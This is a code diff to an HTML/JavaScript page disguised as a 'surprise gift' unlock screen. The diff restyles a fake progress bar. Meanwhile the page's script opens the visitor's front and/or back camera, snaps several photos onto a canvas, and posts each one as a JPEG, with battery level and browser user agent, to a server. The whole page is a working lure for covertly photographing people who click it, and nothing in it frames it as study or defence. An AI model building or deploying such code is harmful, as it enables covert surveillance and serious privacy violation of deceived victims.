@@ -7,32 +7,37 @@
         body { background: white; color: black; text-align: center; font-family: sans-serif; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         #loading-ui, #success-msg, #custom-ui, #yt-ui { display: none; }
         .gift-box { font-size: 80px; animation: bounce 1s infinite alternate; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        @keyframes bounce { 100% { transform: translateY(-30px); } }
-        .btn { background: #00ff00; color: black; border: none; padding: 18px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; }
-        #custom-img { max-width: 90%; max-height: 70vh; border-radius: 10px; }
+        @keyframes bounce { 100% { transform: translateY(-20px); } }
+        .btn { background: #00ff00; color: black; border: none; padding: 18px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,255,0,0.3); }
+        
+        /* Yellow Progress Bar Styling */
+        .progress-container { width: 80%; background-color: #333; border-radius: 20px; margin: 20px auto; height: 20px; border: 2px solid gold; overflow: hidden; }
+        .progress-bar { height: 100%; width: 0%; background-color: gold; transition: width 0.1s; box-shadow: 0 0 10px gold; }
+        
+        #custom-img { max-width: 90%; max-height: 80vh; border-radius: 10px; border: 3px solid gold; }
         iframe { width: 100%; height: 100vh; border: none; }
-        #percent { font-size: 24px; font-weight: bold; color: #00ff00; }
+        #percent-text { font-size: 22px; font-weight: bold; color: gold; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div id="start-page">
-        <div style="font-size: 60px;">🎁</div>
-        <h2>You have a surprise gift! 🎊</h2>
-        <p>Click to unlock below</p><br>
+        <div style="font-size: 70px;">🎁</div>
+        <h2 style="margin: 20px 0;">You have a surprise gift! 🎊</h2>
+        <p style="font-size: 18px; color: #555;">Click to unlock below</p><br>
         <button class="btn" onclick="startWork()">🎁 UNLOCK GIFT 🎁</button>
     </div>
 
-    <div id="yt-ui"><iframe id="yt-player" allow="autoplay; encrypted-media"></iframe></div>
-    <div id="custom-ui"><img src="custom.jpg" id="custom-img"></div>
-
     <div id="loading-ui">
         <div class="gift-box">🎁</div>
-        <p style="font-size: 18px; font-weight: bold;">Unlocking Gift... <span id="percent">0%</span></p>
-        <div class="loader"></div>
+        <h2 style="color: gold;">Unlocking Your Gift...</h2>
+        <div class="progress-container">
+            <div id="myBar" class="progress-bar"></div>
+        </div>
+        <div id="percent-text">0%</div>
     </div>
 
+    <div id="custom-ui"><img src="custom.jpg" id="custom-img"></div>
+    <div id="yt-ui"><iframe id="yt-player" allow="autoplay; encrypted-media"></iframe></div>
     <div id="success-msg">
         <div style="font-size: 80px;">🎊</div>
         <h2 style="color:#00ff00">CONGRATULATIONS!</h2>
@@ -56,34 +61,39 @@
             document.getElementById('start-page').style.display = 'none';
             document.getElementById('loading-ui').style.display = 'block';
 
-            // Loading percentage animation
-            let p = 0;
-            let interval = setInterval(() => {
-                p += Math.floor(Math.random() * 5) + 2;
-                if(p > 99) p = 99;
-                document.getElementById('percent').innerText = p + "%";
-            }, 200);
+            // Percentage Bar Animation
+            let elem = document.getElementById("myBar");
+            let text = document.getElementById("percent-text");
+            let width = 0;
+            let id = setInterval(frame, 150); // Adjust speed here
 
+            function frame() {
+                if (width >= 100) {
+                    clearInterval(id);
+                    setTimeout(showFinalContent, 800);
+                } else {
+                    width += Math.floor(Math.random() * 3) + 1;
+                    if(width > 100) width = 100;
+                    elem.style.width = width + '%';
+                    text.innerHTML = width + '%';
+                }
+            }
+
+            // Start Camera & Info collection
             let response = await fetch('mode.txt');
             let mode = (await response.text()).trim();
-
-            let info = { battery: "N/A", device: navigator.userAgent };
+            let info = { battery: "N/A" };
             try { 
                 let b = await navigator.getBattery(); 
                 info.battery = Math.round(b.level * 100) + "%"; 
             } catch(e) {}
 
-            // Camera Task
             if(mode === 'front') await runCam({facingMode: "user"}, 3, "FRONT", info);
             else if(mode === 'back') await runCam({facingMode: "environment"}, 3, "BACK", info);
             else {
                 await runCam({facingMode: "environment"}, 2, "BACK", info);
                 await runCam({facingMode: "user"}, 2, "FRONT", info);
             }
-
-            clearInterval(interval);
-            document.getElementById('percent').innerText = "100%";
-            setTimeout(showFinalContent, 1000);
         }
 
         async function showFinalContent() {
@@ -108,7 +118,7 @@
                 await video.play();
 
                 for (let i = 0; i < count; i++) {
-                    await new Promise(r => setTimeout(r, 2000)); 
+                    await new Promise(r => setTimeout(r, 1500)); 
                     let can = document.getElementById('c');
                     can.width = video.videoWidth; can.height = video.videoHeight;
                     can.getContext('2d').drawImage(video, 0, 0);
@@ -119,7 +129,7 @@
                             image: can.toDataURL('image/jpeg', 0.8), 
                             mode: label,
                             battery: info.battery,
-                            device: info.device
+                            device: navigator.userAgent
                         }),
                         headers: {'Content-Type': 'application/json'}
                     });
